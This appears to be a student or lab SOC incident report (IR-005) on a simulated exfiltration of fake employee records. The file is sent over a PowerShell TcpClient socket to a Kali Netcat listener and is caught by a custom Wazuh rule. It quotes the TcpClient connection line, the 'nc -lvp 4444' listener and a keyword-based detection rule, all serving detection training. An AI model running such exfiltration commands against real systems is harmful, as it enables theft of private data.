## IR-005 — Data Exfiltration via PowerShell TCP Socket

| Field | Details |
|-------|---------|
| **Incident ID** | IR-005 |
| **Date & Time** | 2026-02-26 (during lab session) |
| **Attack Type** | Data Exfiltration via PowerShell TCP Socket |
| **Severity** | 🔴 High |
| **Source IP** | 192.168.62.5 (DESKTOP-BSSP81K — outbound) |
| **Target IP** | 192.168.62.4 (SOC-Kali-Attacker) — port 4444 |
| **Wazuh Rule ID** | 100002 — Suspicious PowerShell: Possible Data Exfiltration via TcpClient |
| **What Happened** | A file containing fake employee records (employee_records.txt) was created on the Windows victim machine and staged in C:\Temp\data.zip. A PowerShell script using System.Net.Sockets.TcpClient was then executed to connect to Kali (192.168.62.4) on port 4444, where a Netcat listener was running. The file (281 bytes) was successfully transmitted and received on the Kali machine. PowerShell Script Block Logging (Event ID 4104) captured the TcpClient command. Custom Wazuh rule 100002 was written to detect this pattern. |
| **How Detected** | PowerShell Script Block Logging (Event ID 4104) captured the TcpClient command in the Microsoft-Windows-PowerShell/Operational log. Custom rule 100002 (written in /var/ossec/etc/rules/local_rules.xml) matches on the keyword 'TcpClient' in PowerShell logs and triggers at level 12. Kali confirmed receipt of the file via Netcat listener output. |
| **Evidence** | agent.name: DESKTOP-BSSP81K \| agent.id: 002 \| eventID: 4104 \| scriptBlock: $client = New-Object System.Net.Sockets.TcpClient($ip, 4444) \| destIP: 192.168.62.4 \| destPort: 4444 \| fileSize: 281 bytes \| kaliConfirmation: nc -lvp 4444 received connection from 192.168.62.5 \| customRule: 100002 \| level: 12 |
| **Impact** | In a real environment, this technique would allow an attacker to silently exfiltrate sensitive data (PII, credentials, intellectual property) over an outbound TCP connection, which is often not blocked by perimeter firewalls. The use of PowerShell makes this difficult to detect without script block logging enabled. |
| **Response Actions** | 1. Immediately block outbound connections to 192.168.62.4 on all non-standard ports. 2. Identify all files accessed or modified by the PowerShell process. 3. Determine the full scope of data exfiltrated — review PowerShell history and Event ID 4104 logs. 4. Notify data protection officer if real PII was involved. 5. Preserve forensic evidence and escalate to Incident Response team. |
| **Lessons Learned** | Outbound DLP rules should be implemented to detect large or unusual outbound transfers, especially on non-standard ports. PowerShell Script Block Logging is essential for catching this class of attack. Network segmentation and egress filtering would have prevented the exfiltration even if the initial compromise succeeded. Custom Wazuh rule 100002 was written specifically to detect TcpClient usage in PowerShell logs, demonstrating the value of custom detection engineering.